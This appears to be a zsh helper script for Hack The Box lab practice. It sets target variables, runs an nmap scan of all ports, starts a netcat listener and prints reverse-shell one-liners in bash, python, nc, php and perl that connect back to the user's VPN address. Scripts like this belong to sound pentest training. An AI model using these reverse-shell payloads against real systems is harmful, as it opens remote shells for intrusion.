#!/usr/bin/env zsh

# HTB-CLI Quick Start Script
# Usage: source quickstart.sh

echo "🚀 HTB-CLI Quick Start"
echo ""

# Function to export target variables
htb-export() {
    if [ -z "$1" ] || [ -z "$2" ]; then
        echo "Usage: htb-export <machine-name> <ip> [domain]"
        return 1
    fi
    
    export TARGET_NAME="$1"
    export TARGET_IP="$2"
    export TARGET_DOMAIN="${3:-${1}.htb}"
    
    echo "✓ Target set:"
    echo "  NAME: $TARGET_NAME"
    echo "  IP: $TARGET_IP"
    echo "  DOMAIN: $TARGET_DOMAIN"
}

# Function to start a quick nmap scan
htb-scan() {
    if [ -z "$TARGET_IP" ]; then
        echo "✗ No target set. Use htb-export first."
        return 1
    fi
    
    echo "🔍 Scanning $TARGET_IP..."
    sudo nmap -p- -T4 --min-rate=1000 -oN "scan_${TARGET_NAME}.txt" "$TARGET_IP"
}

# Function to start listener
htb-listen() {
    local port="${1:-4444}"
    echo "👂 Starting listener on port $port..."
    nc -lvnp "$port"
}

# Function to generate reverse shell
htb-shell() {
    if [ -z "$1" ]; then
        echo "Usage: htb-shell <type> [port]"
        echo "Types: bash, python, nc, php, perl"
        return 1
    fi
    
    local type="$1"
    local port="${2:-4444}"
    local ip=$(ip addr show tun0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1)
    
    if [ -z "$ip" ]; then
        echo "✗ Could not detect VPN IP (tun0)"
        return 1
    fi
    
    case "$type" in
        bash)
            echo "bash -i >& /dev/tcp/$ip/$port 0>&1"
            ;;
        python)
            echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
            ;;
        nc)
            echo "nc -e /bin/sh $ip $port"
            ;;
        php)
            echo "php -r '\$sock=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
            ;;
        perl)
            echo "perl -e 'use Socket;\$i=\"$ip\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}';'"
            ;;
        *)
            echo "Unknown shell type: $type"
            return 1
            ;;
    esac
}

# Aliases for common commands
alias htb='htb-cli'
alias htb-machines='htb-cli machines list'
alias htb-active='htb-cli machines active'
alias htb-vpn='htb-cli vpn status'

echo "✓ HTB-CLI helpers loaded!"
echo ""
echo "Available functions:"
echo "  htb-export <name> <ip> [domain]  - Set target environment variables"
echo "  htb-scan                         - Quick nmap scan of target"
echo "  htb-listen [port]                - Start netcat listener (default: 4444)"
echo "  htb-shell <type> [port]          - Generate reverse shell payload"
echo ""
echo "Aliases:"
echo "  htb                              - htb-cli"
echo "  htb-machines                     - List machines"
echo "  htb-active                       - Show active machine"
echo "  htb-vpn                          - VPN status"
echo ""
